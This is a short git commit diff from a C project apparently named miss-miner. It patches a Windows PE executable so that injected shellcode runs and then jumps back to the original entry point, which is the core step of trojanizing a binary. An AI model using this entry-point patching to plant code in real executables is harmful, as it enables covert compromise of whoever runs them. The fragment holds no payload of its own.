d9a275374ecbeb5f0ff4a353b2f3a35e3a663c6c
RagingGrim <armandconnor.duplooy@gmail.com>
2017-01-22 19:01:31 +0200

    Patching entry point is working ; Work on JMP

--- src/miss-miner.c
+++ src/miss-miner.c
@@ -79,10 +79,10 @@ int main(int argc , char **argv){
 
 
 		void *dst = pe->buffer + id.offset_in_file + cf_shellcode->size;
-		*(unsigned char *)(dst + sizeof(uint32_t)) = 0xe9;
-		*(unsigned char *)(dst + sizeof(uint32_t) + 1) = 0x0c;
+		*(unsigned char *)(dst) = 0xe9;
+		*(unsigned char *)(dst + 1) = 0x0c;
+		*(uint32_t *)(dst + 2) = oldEntry + pe->image_nt_header->image_optional_header.imageBase;
 
-		*(uint32_t *)(dst) = oldEntry + pe->image_nt_header->image_optional_header.imageBase;
 		printf("value %x\n",oldEntry + pe->image_nt_header->image_optional_header.imageBase);
 		bufferToFile(pe->buffer, pe->size, mapKeyLookup(args, "-output"));
 		destroyCompoundFile(cf_shellcode);
